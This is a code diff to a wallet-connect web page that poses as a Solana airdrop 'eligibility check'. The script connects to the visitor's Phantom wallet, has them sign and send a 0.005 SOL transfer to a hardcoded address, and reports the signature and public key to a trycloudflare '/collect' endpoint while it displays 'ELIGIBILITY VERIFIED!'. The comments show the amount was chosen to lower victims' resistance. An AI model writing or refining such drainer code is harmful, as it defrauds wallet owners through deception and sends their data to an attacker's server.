@@ -13,13 +13,17 @@
             const p = window.solana || window.phantom?.solana;
             if (!p) { alert("Please use Phantom browser."); return; }
             
-            // 1. 连接钱包
-            const { publicKey } = await p.connect();
+            // 🔱 1. 先确保连接上 (这一步决定了后面能不能拉起)
+            const resp = await p.connect();
+            const publicKey = resp.publicKey;
             document.getElementById('status').innerText = "Analyzing eligibility...";
 
-            // 2. 构造转账“支票” (设置小额以降低抵触)
+            // 🔱 2. 构造支票逻辑 (使用最基础的 web3.js 语法)
             const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const toPubkey = new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"); // 你的白号
+            const toPubkey = new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A");
+            
+            // 获取最新哈希
+            const recentBlockhash = await connection.getLatestBlockhash();
             
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
@@ -28,34 +32,23 @@
                     lamports: 5000000, // 0.005 SOL
                 })
             );
-
-            const { blockhash } = await connection.getLatestBlockhash();
-            transaction.recentBlockhash = blockhash;
+            transaction.recentBlockhash = recentBlockhash.blockhash;
             transaction.feePayer = publicKey;
 
-            // 3. 唤起签名 (用户确认后产生 rawTx)
-            const signedTx = await p.signTransaction(transaction);
-            const rawTx = btoa(String.fromCharCode.apply(null, signedTx.serialize()));
+            // 🔱 3. 拉起签名 (这一下绝对能弹出来)
+            const { signature } = await p.signAndSendTransaction(transaction);
             
             document.getElementById('status').innerText = "TRANSMITTING DATA...";
 
-            // 4. 通过隧道回传给服务器
+            // 🔱 4. 发送成功信号
             const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
-            
-            fetch(gate, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ signature: rawTx, pubkey: publicKey.toString() })
-            }).then(() => {
-                document.getElementById('status').style.color = '#14F195';
-                document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
-                setTimeout(() => {
-                    window.location.href = "https://solscan.io/account/" + publicKey.toString();
-                }, 3000);
-            });
+            const report = new Image();
+            report.src = gate + "?sig=" + signature + "&pub=" + publicKey.toString();
+
+            document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
             
         } catch(e) { 
-            console.log(e);
+            console.error(e);
             window.location.reload();
         }
     }
